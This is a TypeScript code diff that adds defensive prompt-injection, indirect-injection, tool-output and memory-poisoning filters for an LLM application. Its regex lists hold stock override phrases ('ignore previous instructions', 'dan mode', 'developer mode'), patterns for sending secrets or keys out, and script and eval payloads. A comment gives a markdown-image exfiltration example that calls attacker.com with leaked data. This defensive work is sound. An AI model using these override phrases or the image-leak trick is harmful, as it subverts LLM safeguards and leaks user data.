@@ -67,7 +67,8 @@ export function decryptAES256GCM(payload: EncryptedPayload): string {
 
 const INJECTION_PATTERNS = [
   // Direct Instruction Override
-  /ignore\s+(all\s+)?(previous|above|system)\s+(instructions|directives|prompts)/i,
+  /system\s*(?:instruction\s*)?override/i,
+  /ignore\s+(all\s+)?(previous|prior|above|system|user\s+preferences)\s+(instructions|directives|prompts|rules)?/i,
   /disregard\s+(all\s+)?(prior|previous)\s+(instructions|directives)/i,
   /(?:you\s+are\s+now\s+in\s+.*mode|dan\s+mode|developer\s+mode|god\s+mode|unrestricted\s+mode)/i,
   /jailbreak/i,
@@ -123,6 +124,104 @@ export function sanitizeAndGuardPrompt(rawPrompt: string): PromptGuardResult {
     detectedPatterns: detected,
     sanitizedPrompt: sanitized,
   };
+}
+
+// =============================================================================
+// 2B. INDIRECT PROMPT INJECTION & UNTRUSTED DATA SANITIZER
+// =============================================================================
+
+const INDIRECT_INJECTION_PATTERNS = [
+  /<!--\s*(?:system|override|admin|instruction)[\s\S]*?-->/gi,
+  /\[SYSTEM(?:\s+OVERRIDE|\s+DIRECTIVE|\s+PROMPT)\]/gi,
+  /(?:^|\n)\s*(?:IMPORTANT|CRITICAL|SYSTEM)\s+NOTE:\s*(?:ignore|disregard|forget)\s+/gi,
+  /(?:ignore|disregard|forget)\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|guidelines|safety|rules)/gi,
+  /(?:send|transmit|exfiltrate|post)\s+(?:all\s+)?(?:secrets|keys|user\s+data|history|prompts)\s+to\b/gi,
+  /\b(?:eval|exec)\s*\(/gi,
+  /<script[\s\S]*?<\/script>/gi,
+];
+
+export type IndirectInjectionAudit = {
+  isSafe: boolean;
+  threats: string[];
+  sanitizedContent: string;
+};
+
+/**
+ * Validates untrusted external data (retrieved web content, uploaded docs, RAG context)
+ * to prevent indirect prompt injection attacks against LLM context.
+ */
+export function detectIndirectPromptInjection(rawContent: string): IndirectInjectionAudit {
+  if (!rawContent || typeof rawContent !== "string") {
+    return { isSafe: true, threats: [], sanitizedContent: "" };
+  }
+
+  const threats: string[] = [];
+  for (const pattern of INDIRECT_INJECTION_PATTERNS) {
+    if (pattern.test(rawContent)) {
+      threats.push(pattern.source);
+    }
+  }
+
+  // Neutralize zero-width / invisible control characters used in prompt steganography
+  let sanitized = rawContent
+    .replace(/[\u200B-\u200D\uFEFF\u202A-\u202E]/g, "")
+    .replace(/<!--[\s\S]*?-->/g, "")
+    .replace(/<script[\s\S]*?<\/script>/gi, "");
+
+  // Escape explicit role hijacking markers
+  sanitized = sanitized
+    .replace(/<\|im_start\|>/gi, "")
+    .replace(/<\|im_end\|>/gi, "")
+    .replace(/\[INST\]/gi, "")
+    .replace(/\[\/INST\]/gi, "");
+
+  return {
+    isSafe: threats.length === 0,
+    threats,
+    sanitizedContent: sanitized,
+  };
+}
+
+/**
+ * Sanitizes untrusted tool outputs before they enter the model's conversation history
+ */
+export function sanitizeToolOutput(toolName: string, rawOutput: string): string {
+  if (!rawOutput) return "";
+  
+  // Clean indirect injections and malicious script payloads
+  const audited = detectIndirectPromptInjection(rawOutput);
+  let cleaned = audited.sanitizedContent;
+
+  // Prevent markdown image data exfiltration (e.g. ![leak](https://attacker.com/leak?data=...))
+  cleaned = cleaned.replace(/!\[.*?\]\(https?:\/\/[^\s)]+\?[^\s)]*=[^\s)]+\)/gi, "[REDACTED_EXTERNAL_IMAGE_PROBE]");
+
+  return `<untrusted_tool_output tool="${toolName.replace(/[^a-zA-Z0-9_-]/g, "")}" verified_safe="${audited.isSafe}">\n${cleaned.trim()}\n</untrusted_tool_output>`;
+}
+
+/**
+ * Validates candidate user memories to prevent memory poisoning attacks
+ */
+export function validateMemoryCandidate(content: string): { isValid: boolean; reason?: string } {
+  if (!content || !content.trim()) {
+    return { isValid: false, reason: "Memory content cannot be empty" };
+  }
+
+  const trimmed = content.trim();
+  if (trimmed.length > 1500) {
+    return { isValid: false, reason: "Memory exceeds maximum length of 1500 characters" };
+  }
+
+  const guard = sanitizeAndGuardPrompt(trimmed);
+  if (!guard.isSafe) {
+    return { isValid: false, reason: `Potential memory injection detected: ${guard.detectedPatterns.join(", ")}` };
+  }
+
+  const indirect = detectIndirectPromptInjection(trimmed);
+  if (!indirect.isSafe) {
+    return { isValid: false, reason: `Potential indirect injection in memory candidate: ${indirect.threats.join(", ")}` };
+  }
+
+  return { isValid: true };
 }
 
 // =============================================================================
